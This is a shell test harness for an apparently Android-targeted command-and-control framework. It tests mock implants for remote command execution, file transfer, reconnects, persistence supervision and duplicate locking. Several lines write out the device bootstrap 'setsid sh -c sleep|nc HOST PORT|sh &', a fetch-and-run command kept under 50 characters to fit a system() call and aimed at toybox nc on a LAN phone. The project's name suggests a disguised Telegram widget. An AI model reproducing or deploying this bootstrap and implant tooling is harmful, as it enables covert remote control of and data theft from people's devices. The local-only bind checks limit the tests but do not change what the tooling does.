#!/bin/sh
# telegramandroidwidget/c2/run_local_test.sh
#
# Host-only end-to-end test.  No phone, no emulator, no internet:
#   1. two mock implants connect to the server (multi-session)
#   2. ping, exec (stdout/stderr/exit), put/get (small + chunked large),
#      sleep, reconnect, session switch, bye
#   3. the loader port serves the bootstrap; `nc | sh` installs a mock
#      implant and it connects (the exact short command used on-device)
#   4. bind-safety refusals (LAN without --allow-lan, public IP)
#
# Usage:  ./run_local_test.sh
#         C2_TEST_DIR=/tmp/opencode/mytest ./run_local_test.sh
#
# Exit code 0 = all checks passed.

set -eu

ROOT=$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)
PY=${PYTHON:-python3}

if ! command -v "$PY" >/dev/null 2>&1; then
    echo "run_local_test: python3 not found" >&2
    exit 2
fi
if ! command -v nc >/dev/null 2>&1; then
    echo "run_local_test: nc not found (host mock needs netcat)" >&2
    exit 2
fi

WORK=${C2_TEST_DIR:-$(mktemp -d "${TMPDIR:-/tmp}/c2test.XXXXXX")}
mkdir -p "$WORK"
PORT=${C2_TEST_PORT:-14544}
LPORT=$((PORT + 1))
PORT2=$((PORT + 2))
LPORT2=$((PORT + 3))
PORT3=$((PORT + 4))
PORT4=$((PORT + 5))
LPORT4=$((PORT + 6))
TOKEN="test-token-$$"
PASS=0
FAIL=0

say() { printf '%s\n' "$*"; }
ok() { PASS=$((PASS + 1)); say "  ok: $*"; }
bad() { FAIL=$((FAIL + 1)); say "  FAIL: $*"; }

check_grep() { # check_grep <file> <pattern> <label>
    if grep -q -- "$2" "$1" 2>/dev/null; then ok "$3"; else bad "$3 (pattern: $2)"; fi
}
check_not_grep() {
    if grep -q -- "$2" "$1" 2>/dev/null; then bad "$3 (unexpected: $2)"; else ok "$3"; fi
}
check_same() { # check_same <a> <b> <label>
    if cmp -s "$1" "$2"; then ok "$3"; else bad "$3 ($1 != $2)"; fi
}
check_file() {
    if [ -f "$1" ]; then ok "$2"; else bad "$2 (missing $1)"; fi
}

kill_pids() {
    for f in "$@"; do
        [ -f "$f" ] || continue
        p=$(cat "$f" 2>/dev/null || true)
        case "$p" in ''|*[!0-9]*) continue ;; esac
        kill "$p" 2>/dev/null || true
    done
    sleep 0.2
    for f in "$@"; do
        [ -f "$f" ] || continue
        p=$(cat "$f" 2>/dev/null || true)
        case "$p" in ''|*[!0-9]*) continue ;; esac
        kill -9 "$p" 2>/dev/null || true
    done
}

cleanup() {
    kill_pids \
        "$WORK/server.pid" "$WORK/server2.pid" \
        "$WORK/mock1/launcher.pid" "$WORK/mock2/launcher.pid" \
        "$WORK/mock1/implant.pid" "$WORK/mock2/implant.pid" \
        "$WORK/loader/sup.pid" "$WORK/loader/implant.pid" \
        "$WORK/rec/launcher.pid" "$WORK/rec/sup.pid" "$WORK/rec/implant.pid" \
        "$WORK/diag_server.pid" "$WORK/diag_server2.pid" \
        "$WORK/lock_server.pid" "$WORK/lock/sup.pid" "$WORK/lock/implant.pid"
}
trap cleanup EXIT INT TERM

# ---------------------------------------------------------------- fixtures
mkdir -p "$WORK/mock1" "$WORK/mock2" "$WORK/remote" "$WORK/dl" \
         "$WORK/logs" "$WORK/logs2" "$WORK/loader"

printf 'small payload line 1\nline 2\n' > "$WORK/small.txt"
# 300 KiB -> base64 > default --max-put (262144) => chunked put path
dd if=/dev/urandom of="$WORK/big.bin" bs=1024 count=300 2>/dev/null
SMALL_SHA=$(sha256sum "$WORK/small.txt" | cut -d' ' -f1)
BIG_SHA=$(sha256sum "$WORK/big.bin" | cut -d' ' -f1)

cat > "$WORK/batch.txt" <<EOF
wait 20 2
sessions
use mock1
ping
exec echo STDOUT_OK; echo STDERR_OK >&2; exit 7
history 3
put $WORK/small.txt $WORK/remote/small.txt
exec wc -c < $WORK/remote/small.txt; sha256sum $WORK/remote/small.txt
put $WORK/big.bin $WORK/remote/big.bin
exec wc -c < $WORK/remote/big.bin; sha256sum $WORK/remote/big.bin
get $WORK/remote/small.txt
get $WORK/remote/big.bin
sleep 1
reconnect 2
sessions
exec echo AFTER_RECONNECT
use mock2
exec echo SECOND_SESSION
bye stop
use mock1
exec echo BEFORE_FINAL_STOP
bye stop
exec echo SHOULD_NOT_RUN
quit
EOF

# ---------------------------------------------------------------- phase 1
say "== phase 1: multi-session protocol =="
"$PY" "$ROOT/server/c2_server.py" \
    --host 127.0.0.1 --port "$PORT" --loader-port "$LPORT" \
    --token "$TOKEN" \
    --log-dir "$WORK/logs" --download-dir "$WORK/dl" \
    --script "$WORK/batch.txt" > "$WORK/server.out" 2>&1 &
echo $! > "$WORK/server.pid"

# give the listeners a moment; the mocks retry until the port is open
sleep 0.6

C2_HOST=127.0.0.1 C2_PORT="$PORT" C2_TOKEN="$TOKEN" C2_ID=mock1 \
C2_DIR="$WORK/mock1" C2_MOCK_UID=10123 C2_MOCK_USER=u0_a123 \
    setsid sh "$ROOT/mock/mock_implant.sh" > "$WORK/mock1.out" 2>&1 &
echo $! > "$WORK/mock1/launcher.pid"
C2_HOST=127.0.0.1 C2_PORT="$PORT" C2_TOKEN="$TOKEN" C2_ID=mock2 \
C2_DIR="$WORK/mock2" C2_MOCK_UID=10124 C2_MOCK_USER=u0_a124 \
    setsid sh "$ROOT/mock/mock_implant.sh" > "$WORK/mock2.out" 2>&1 &
echo $! > "$WORK/mock2/launcher.pid"

# wait for the batch to finish (server exits after `quit`)
i=0
while kill -0 "$(cat "$WORK/server.pid")" 2>/dev/null && [ "$i" -lt 80 ]; do
    sleep 0.5
    i=$((i + 1))
done
if kill -0 "$(cat "$WORK/server.pid")" 2>/dev/null; then
    bad "phase 1 server did not exit"
    kill -9 "$(cat "$WORK/server.pid")" 2>/dev/null || true
fi

OUT="$WORK/server.out"
check_grep "$OUT" "hello implant=mock1" "mock1 hello"
check_grep "$OUT" "hello implant=mock2" "mock2 hello"
check_grep "$OUT" ": mock1 (" "mock1 announced"
check_grep "$OUT" ": mock2 (" "mock2 announced"
check_grep "$OUT" "2 live session(s)" "both sessions registered"
check_grep "$OUT" "pong" "ping/pong"
check_grep "$OUT" "STDOUT_OK" "exec stdout"
check_grep "$OUT" "STDERR_OK" "exec stderr"
check_grep "$OUT" "exec rc=7" "exec exit code"
check_grep "$OUT" "ok  exec echo STDOUT_OK" "command history shows the exec"
check_grep "$OUT" "\[put\].*small.txt" "single put"
check_grep "$OUT" "\[put\].*big.bin" "chunked put"
check_grep "$OUT" "$SMALL_SHA" "remote small sha256 (exec)"
check_grep "$OUT" "$BIG_SHA" "remote big sha256 (exec)"
check_grep "$OUT" "\[get\].*small.txt" "get small"
check_grep "$OUT" "\[get\].*big.bin" "get big"
check_grep "$OUT" "AFTER_RECONNECT" "exec after reconnect"
check_grep "$OUT" "SECOND_SESSION" "second session exec"
check_grep "$OUT" "BEFORE_FINAL_STOP" "final exec before stop"
check_grep "$OUT" "session .* is back" "reconnect waited for new sid"
check_not_grep "$OUT" "^SHOULD_NOT_RUN$" "stopped session does not execute"
check_file "$WORK/remote/small.txt" "uploaded small exists"
check_file "$WORK/remote/big.bin" "uploaded big exists"
check_same "$WORK/small.txt" "$WORK/remote/small.txt" "uploaded small bytes"
check_same "$WORK/big.bin" "$WORK/remote/big.bin" "uploaded big bytes"
check_file "$WORK/dl/small.txt" "downloaded small exists"
check_file "$WORK/dl/big.bin" "downloaded big exists"
check_same "$WORK/small.txt" "$WORK/dl/small.txt" "downloaded small bytes"
check_same "$WORK/big.bin" "$WORK/dl/big.bin" "downloaded big bytes"
check_file "$WORK/mock1/stop" "bye stop created stop marker"

# ---------------------------------------------------------------- phase 2
say "== phase 2: loader bootstrap (nc | sh) =="
cat > "$WORK/batch2.txt" <<EOF
wait 20 1
sessions
exec echo LOADED_OK
bye stop
quit
EOF

"$PY" "$ROOT/server/c2_server.py" \
    --host 127.0.0.1 --port "$PORT2" --loader-port "$LPORT2" \
    --loader-mock-dir "$WORK/loader" \
    --log-dir "$WORK/logs2" --download-dir "$WORK/dl" \
    --script "$WORK/batch2.txt" > "$WORK/server2.out" 2>&1 &
echo $! > "$WORK/server2.pid"

i=0
while ! grep -q "loader listening" "$WORK/server2.out" 2>/dev/null && [ "$i" -lt 40 ]; do
    sleep 0.25
    i=$((i + 1))
done
check_grep "$WORK/server2.out" "loader listening" "loader port up"

# exact shape of the on-device command, with host nc instead of toybox
BOOTCMD="setsid sh -c 'sleep 2|nc 127.0.0.1 $LPORT2|sh' &"
sh -c "$BOOTCMD" > "$WORK/boot.out" 2>&1 || true

i=0
while kill -0 "$(cat "$WORK/server2.pid")" 2>/dev/null && [ "$i" -lt 80 ]; do
    sleep 0.5
    i=$((i + 1))
done
if kill -0 "$(cat "$WORK/server2.pid")" 2>/dev/null; then
    bad "phase 2 server did not exit"
    kill -9 "$(cat "$WORK/server2.pid")" 2>/dev/null || true
fi

check_grep "$WORK/boot.out" "BOOT_OK" "bootstrap ran"
check_grep "$WORK/server2.out" "loader: serving" "loader served the script"
check_grep "$WORK/server2.out" "LOADED_OK" "loaded implant exec"
check_grep "$WORK/server2.out" "10123" "loaded implant reports mock uid"
check_grep "$WORK/server2.out" "Mock-Device" "loaded implant reports mock device"
check_file "$WORK/loader/implant.sh" "bootstrap wrote implant.sh"
check_file "$WORK/loader/supervisor.sh" "bootstrap wrote supervisor.sh"
check_file "$WORK/loader/stop" "loaded implant stopped cleanly"

# ---------------------------------------------------------------- phase 3
say "== phase 3: diagnostic hello (C2_DIAG=1) =="
mkdir -p "$WORK/diag"
"$PY" "$ROOT/server/c2_server.py" \
    --host 127.0.0.1 --port "$PORT2" --loader-port "$LPORT2" \
    --loader-mock-dir "$WORK/diag" --bootstrap-diag \
    --token "$TOKEN" \
    --log-dir "$WORK/logs_diag" --download-dir "$WORK/dl" \
    --wait-session 15 --cmd "sessions" --cmd "pause 3" --cmd quit \
    > "$WORK/diag_server.out" 2>&1 &
echo $! > "$WORK/diag_server.pid"
i=0
while ! grep -q "loader listening" "$WORK/diag_server.out" 2>/dev/null && [ "$i" -lt 40 ]; do
    sleep 0.25
    i=$((i + 1))
done
setsid sh -c "sleep 2|nc 127.0.0.1 $LPORT2|sh" > "$WORK/diag_fetch.out" 2>&1 &
i=0
while ! grep -q "DIAG_DONE" "$WORK/diag_fetch.out" 2>/dev/null && [ "$i" -lt 60 ]; do
    sleep 0.25
    i=$((i + 1))
done
i=0
while kill -0 "$(cat "$WORK/diag_server.pid")" 2>/dev/null && [ "$i" -lt 40 ]; do
    sleep 0.25
    i=$((i + 1))
done
check_grep "$WORK/diag_server.out" "hello implant=diag-10123" "diag hello reaches the server"
check_grep "$WORK/diag_server.out" "device=diag" "diag hello metadata"
check_grep "$WORK/diag_server.out" "build=" "diag hello carries the build"
check_grep "$WORK/diag/diag.out" "DIAG_RX" "diag printed the server reply"
check_grep "$WORK/diag/diag.out" '"op":"welcome"' "server sent welcome"
check_grep "$WORK/diag_fetch.out" "DIAG_DONE rc=0" "diag exited cleanly"
check_file "$WORK/diag/diag.stamp" "diag stamped its build"
check_grep "$WORK/diag/diag.trace" "stage=write rc=0" "diag dir is writable"
check_grep "$WORK/diag/diag.trace" "stage=cn-mkfifo rc=0" "diag FIFO created"
check_grep "$WORK/diag/diag.trace" "stage=cn-fd8 rc=0" "diag IN fifo pre-opened O_RDWR"
check_grep "$WORK/diag/diag.trace" "stage=cn-fd9 rc=0" "diag OUT fifo pre-opened O_RDWR"
check_grep "$WORK/diag/diag.trace" "stage=cn-nc-fork" "diag nc fork returned"
check_grep "$WORK/diag/diag.trace" "stage=cn-nc-pid" "diag nc pid recorded"
check_grep "$WORK/diag/diag.trace" "stage=cn-done" "diag transport setup completed"
check_grep "$WORK/diag/diag.trace" "stage=ds-end rc=0" "diag hello write succeeded"
check_grep "$WORK/diag/diag.trace" "stage=rx" "diag received the welcome"
check_grep "$WORK/diag/diag.trace" "stage=exit rc=0" "diag EXIT trap recorded rc=0"

# second fetch must be suppressed by the stamp (no new session)
"$PY" "$ROOT/server/c2_server.py" \
    --host 127.0.0.1 --port "$PORT2" --loader-port "$LPORT2" \
    --loader-mock-dir "$WORK/diag" --bootstrap-diag \
    --token "$TOKEN" \
    --log-dir "$WORK/logs_diag" --download-dir "$WORK/dl" \
    --wait-session 2 --cmd "pause 1" --cmd quit > "$WORK/diag_server2.out" 2>&1 &
echo $! > "$WORK/diag_server2.pid"
i=0
while ! grep -q "loader listening" "$WORK/diag_server2.out" 2>/dev/null && [ "$i" -lt 40 ]; do
    sleep 0.25
    i=$((i + 1))
done
setsid sh -c "sleep 2|nc 127.0.0.1 $LPORT2|sh" > "$WORK/diag_fetch2.out" 2>&1 &
sleep 2
check_grep "$WORK/diag_fetch2.out" "C2_DIAG_ALREADY_RAN" "diag stamp suppresses a second fetch"
kill_pids "$WORK/diag_server2.pid"

# ---------------------------------------------------------------- phase 4
say "== phase 4: bootstrap storm lock =="
mkdir -p "$WORK/lock"
cat > "$WORK/lock_batch.txt" <<EOF
wait 20 1
sessions
sleep 6
exec echo LOCK_OK
bye stop
quit
EOF
"$PY" "$ROOT/server/c2_server.py" \
    --host 127.0.0.1 --port "$PORT4" --loader-port "$LPORT4" \
    --loader-mock-dir "$WORK/lock" --token "$TOKEN" \
    --log-dir "$WORK/logs_lock" --download-dir "$WORK/dl" \
    --script "$WORK/lock_batch.txt" > "$WORK/lock_server.out" 2>&1 &
echo $! > "$WORK/lock_server.pid"
i=0
while ! grep -q "loader listening" "$WORK/lock_server.out" 2>/dev/null && [ "$i" -lt 40 ]; do
    sleep 0.25
    i=$((i + 1))
done
setsid sh -c "sleep 2|nc 127.0.0.1 $LPORT4|sh" > "$WORK/lock_fetch1.out" 2>&1 &
i=0
while ! grep -q "hello implant=" "$WORK/lock_server.out" 2>/dev/null && [ "$i" -lt 40 ]; do
    sleep 0.25
    i=$((i + 1))
done
# a second direct implant with the same state dir must lose the lock and exit
LIVE_PID=$(cat "$WORK/lock/implant.pid" 2>/dev/null || true)
C2_MOCK=1 C2_DIR="$WORK/lock" C2_HOST=127.0.0.1 C2_PORT="$PORT4" \
C2_TOKEN="$TOKEN" C2_ID=duplicate \
    setsid sh "$ROOT/implant/implant.sh" > "$WORK/lock_dup.out" 2>&1 &
sleep 1
check_grep "$WORK/lock/implant.log" "ALREADY_RUNNING" "duplicate implant refused by lock"
if [ -n "$LIVE_PID" ] && [ "$(cat "$WORK/lock/implant.pid" 2>/dev/null)" = "$LIVE_PID" ]; then
    ok "duplicate did not overwrite the live PID"
else
    bad "duplicate clobbered implant.pid"
fi

# immediate refetch: the first bootstrap may still hold boot.lock
setsid sh -c "sleep 2|nc 127.0.0.1 $LPORT4|sh" > "$WORK/lock_fetch2.out" 2>&1 &
sleep 3
# later refetch: the build sentinel must answer ALREADY
setsid sh -c "sleep 2|nc 127.0.0.1 $LPORT4|sh" > "$WORK/lock_fetch3.out" 2>&1 &
i=0
while kill -0 "$(cat "$WORK/lock_server.pid")" 2>/dev/null && [ "$i" -lt 80 ]; do
    sleep 0.5
    i=$((i + 1))
done
if kill -0 "$(cat "$WORK/lock_server.pid")" 2>/dev/null; then
    bad "lock server did not exit"
    kill -9 "$(cat "$WORK/lock_server.pid")" 2>/dev/null || true
fi
check_grep "$WORK/lock_server.out" "LOCK_OK" "only one implant survived the storm"
HCO=$(grep -c "hello implant=" "$WORK/lock_server.out" 2>/dev/null || true)
if [ "$HCO" -eq 1 ]; then ok "exactly one control hello"; else bad "control hellos=$HCO (want 1)"; fi
check_grep "$WORK/lock_fetch2.out" "C2_BOOTSTRAP_BUSY" "concurrent bootstrap refused"
check_grep "$WORK/lock_fetch3.out" "C2_ALREADY_RUNNING" "same-build bootstrap refused"
check_file "$WORK/lock/stop" "storm survivor stopped cleanly"

# ---------------------------------------------------------------- phase 5
say "== phase 5: dead-server detection (supervisor + RX timeout) =="
mkdir -p "$WORK/rec"
cp "$ROOT/implant/implant.sh" "$ROOT/implant/supervisor.sh" "$WORK/rec/"

C2_MOCK=1 C2_DIR="$WORK/rec" C2_HOST=127.0.0.1 C2_PORT="$PORT3" C2_ID=rec \
C2_MOCK_UID=10123 C2_SH=sh C2_RX_TIMEOUT=4 \
    setsid sh "$WORK/rec/supervisor.sh" > "$WORK/rec/sup.out" 2>&1 &
echo $! > "$WORK/rec/launcher.pid"
sleep 1

"$PY" "$ROOT/server/c2_server.py" --host 127.0.0.1 --port "$PORT3" --loader-port 0 \
    --ping-interval 1 --ping-timeout 8 \
    --log-dir "$WORK/logs3" --download-dir "$WORK/dl" \
    --wait-session 20 --cmd "exec echo RECOVERY_ONE" --cmd quit \
    > "$WORK/server3a.out" 2>&1 || true

"$PY" "$ROOT/server/c2_server.py" --host 127.0.0.1 --port "$PORT3" --loader-port 0 \
    --ping-interval 1 --ping-timeout 8 \
    --log-dir "$WORK/logs3" --download-dir "$WORK/dl" \
    --wait-session 25 --cmd "exec echo RECOVERY_TWO" --cmd "bye stop" --cmd quit \
    > "$WORK/server3b.out" 2>&1 || true

check_grep "$WORK/server3a.out" "RECOVERY_ONE" "first server exec"
check_grep "$WORK/server3b.out" "RECOVERY_TWO" "reconnected after server death"
check_grep "$WORK/rec/implant.log" "RX_TIMEOUT" "RX timeout detected dead server"
check_file "$WORK/rec/stop" "recovery implant stopped cleanly"

# ---------------------------------------------------------------- phase 6
say "== phase 6: local-only safety =="
if "$PY" "$ROOT/server/c2_server.py" --host <LAN_IP> \
        --loader-port 5555 --print-bootstrap > "$WORK/safe1.out" 2>&1; then
    bad "LAN bind accepted without --allow-lan"
else
    check_grep "$WORK/safe1.out" "allow-lan" "LAN bind refused without --allow-lan"
fi

if "$PY" "$ROOT/server/c2_server.py" --host 8.8.8.8 --allow-lan \
        --loader-port 5555 --print-bootstrap > "$WORK/safe2.out" 2>&1; then
    bad "public bind accepted"
else
    check_grep "$WORK/safe2.out" "not a private/loopback" "public bind refused"
fi

if "$PY" "$ROOT/server/c2_server.py" --host 0.0.0.0 --allow-lan \
        --loader-port 5555 --print-bootstrap > "$WORK/safe3.out" 2>&1; then
    bad "0.0.0.0 bind accepted"
else
    check_grep "$WORK/safe3.out" "0.0.0.0/::" "wildcard bind refused"
fi

"$PY" "$ROOT/server/c2_server.py" --host <LAN_IP> --allow-lan \
    --loader-port 5555 --print-bootstrap > "$WORK/cmd.out" 2>&1
CMD=$(sed -n '2p' "$WORK/cmd.out")
CLEN=${#CMD}
if [ "$CLEN" -le 120 ]; then
    ok "device bootstrap is short ($CLEN chars)"
else
    bad "device bootstrap too long ($CLEN chars)"
fi
case "$CMD" in
    *"/system/bin/toybox nc <LAN_IP> 5555"*) ok "device bootstrap uses toybox nc" ;;
    *) bad "device bootstrap missing toybox nc: $CMD" ;;
esac

# scan only the shipped runtime scripts; run_local_test.sh itself is excluded
# because it contains this pattern as a string.  It only talks to 127.0.0.1.
if grep -RInE 'https?://[A-Za-z0-9]|\bcurl\b|\bwget\b' \
        "$ROOT/server" "$ROOT/implant" "$ROOT/mock" \
        > "$WORK/egress.out" 2>/dev/null; then
    bad "internet-egress pattern found in scripts (see $WORK/egress.out)"
    cat "$WORK/egress.out"
else
    ok "no http/curl/wget in server, implant or mock"
fi

# ---------------------------------------------------------------- phase 7
say "== phase 7: short bootstrap (PATH nc, <=50 chars, system() returns) =="
PORT5=$((PORT + 8))
LPORT5=$((PORT + 9))
"$PY" "$ROOT/server/c2_server.py" --host 127.0.0.1 --port "$PORT5" \
    --loader-port "$LPORT5" --bootstrap nc --print-bootstrap \
    > "$WORK/short_cmd.out" 2>&1
SHORT_CMD=$(sed -n '2p' "$WORK/short_cmd.out")
SLEN=${#SHORT_CMD}
if [ "$SLEN" -le 50 ]; then
    ok "short bootstrap is $SLEN chars (limit 50)"
else
    bad "short bootstrap is $SLEN chars (>50)"
fi
EXPECT_SHORT="setsid sh -c 'sleep 5|nc 127.0.0.1 $LPORT5|sh'&"
if [ "$SHORT_CMD" = "$EXPECT_SHORT" ]; then
    ok "exact short form (setsid + sleep|nc|sh + &)"
else
    bad "unexpected short form: $SHORT_CMD"
fi
case "$SHORT_CMD" in
    *toybox*|*/system/bin/*) bad "short form must use PATH applets only: $SHORT_CMD" ;;
    *) ok "short form uses bare PATH applets (nc, sleep, sh, setsid)" ;;
esac
if sh -n -c "$SHORT_CMD" 2>/dev/null; then
    ok "short form parses in sh"
else
    bad "short form does not parse in sh"
fi

mkdir -p "$WORK/short"
cat > "$WORK/short_batch.txt" <<EOF
wait 25 1
sessions
exec echo SHORT_OK
exec id
bye stop
quit
EOF
"$PY" "$ROOT/server/c2_server.py" --host 127.0.0.1 --port "$PORT5" \
    --loader-port "$LPORT5" --loader-mock-dir "$WORK/short" \
    --token "$TOKEN" --log-dir "$WORK/logs_short" --download-dir "$WORK/dl" \
    --script "$WORK/short_batch.txt" > "$WORK/short_server.out" 2>&1 &
echo $! > "$WORK/short_server.pid"
i=0
while ! grep -q "loader listening" "$WORK/short_server.out" 2>/dev/null && [ "$i" -lt 40 ]; do
    sleep 0.25
    i=$((i + 1))
done

# system() semantics: sh -c '<cmd>' must return while the detached pipeline
# keeps running.  Measure the outer shell's wall time.
T0=$(date +%s%N)
sh -c "$SHORT_CMD"
SRC=$?
T1=$(date +%s%N)
SHORT_MS=$(( (T1 - T0) / 1000000 ))
if [ "$SRC" -eq 0 ] && [ "$SHORT_MS" -lt 2000 ]; then
    ok "system() returned in ${SHORT_MS}ms while the pipeline stayed up"
else
    bad "system() did not return promptly (rc=$SRC, ${SHORT_MS}ms)"
fi

i=0
while kill -0 "$(cat "$WORK/short_server.pid")" 2>/dev/null && [ "$i" -lt 100 ]; do
    sleep 0.5
    i=$((i + 1))
done
if kill -0 "$(cat "$WORK/short_server.pid")" 2>/dev/null; then
    bad "short-bootstrap server did not exit"
    kill -9 "$(cat "$WORK/short_server.pid")" 2>/dev/null || true
fi
check_grep "$WORK/short_server.out" "loader: serving" "short bootstrap fetched the loader"
check_grep "$WORK/short_server.out" "hello implant=" "short bootstrap hello"
check_grep "$WORK/short_server.out" "SHORT_OK" "short bootstrap exec stdout"
check_grep "$WORK/short_server.out" "uid=" "short bootstrap exec id"
check_grep "$WORK/short_server.out" "10123" "short bootstrap mock uid"
check_file "$WORK/short/stop" "short bootstrap stopped cleanly"

# toybox-proxy: resolve nc/sleep/setsid through applet symlinks on PATH
# (busybox applet dispatch = the same argv[0] mechanism toybox uses).
if command -v busybox >/dev/null 2>&1 \
   && busybox --list 2>/dev/null | grep -qx nc \
   && busybox --list 2>/dev/null | grep -qx sleep \
   && busybox --list 2>/dev/null | grep -qx setsid; then
    mkdir -p "$WORK/tb" "$WORK/short2"
    for app in nc sleep setsid; do ln -sf "$(command -v busybox)" "$WORK/tb/$app"; done
    ok "toybox proxy: busybox applet symlinks created (nc, sleep, setsid)"
    cat > "$WORK/short2_batch.txt" <<EOF
wait 25 1
exec echo SHORT_TB_OK
bye stop
quit
EOF
    "$PY" "$ROOT/server/c2_server.py" --host 127.0.0.1 --port "$PORT5" \
        --loader-port "$LPORT5" --loader-mock-dir "$WORK/short2" \
        --token "$TOKEN" --log-dir "$WORK/logs_short2" --download-dir "$WORK/dl" \
        --script "$WORK/short2_batch.txt" > "$WORK/short2_server.out" 2>&1 &
    echo $! > "$WORK/short2_server.pid"
    i=0
    while ! grep -q "loader listening" "$WORK/short2_server.out" 2>/dev/null && [ "$i" -lt 40 ]; do
        sleep 0.25
        i=$((i + 1))
    done
    T0=$(date +%s%N)
    PATH="$WORK/tb:$PATH" sh -c "$SHORT_CMD"
    SRC=$?
    T1=$(date +%s%N)
    SHORT_MS=$(( (T1 - T0) / 1000000 ))
    if [ "$SRC" -eq 0 ] && [ "$SHORT_MS" -lt 2000 ]; then
        ok "applet-symlink system() returned in ${SHORT_MS}ms"
    else
        bad "applet-symlink system() did not return (rc=$SRC, ${SHORT_MS}ms)"
    fi
    i=0
    while kill -0 "$(cat "$WORK/short2_server.pid")" 2>/dev/null && [ "$i" -lt 100 ]; do
        sleep 0.5
        i=$((i + 1))
    done
    if kill -0 "$(cat "$WORK/short2_server.pid")" 2>/dev/null; then
        bad "applet-symlink server did not exit"
        kill -9 "$(cat "$WORK/short2_server.pid")" 2>/dev/null || true
    fi
    check_grep "$WORK/short2_server.out" "loader: serving" "applet-symlink nc fetched the loader"
    check_grep "$WORK/short2_server.out" "hello implant=" "applet-symlink hello"
    check_grep "$WORK/short2_server.out" "SHORT_TB_OK" "applet-symlink exec stdout"
    check_file "$WORK/short2/stop" "applet-symlink bootstrap stopped cleanly"
else
    say "  skip: busybox applet proxy unavailable on this host"
fi

# ---------------------------------------------------------------- summary
say ""
say "work dir: $WORK"
if [ "$FAIL" -eq 0 ]; then
    say "PASS ($PASS checks)"
    exit 0
fi
say "FAIL ($FAIL failed, $PASS passed)"
exit 1
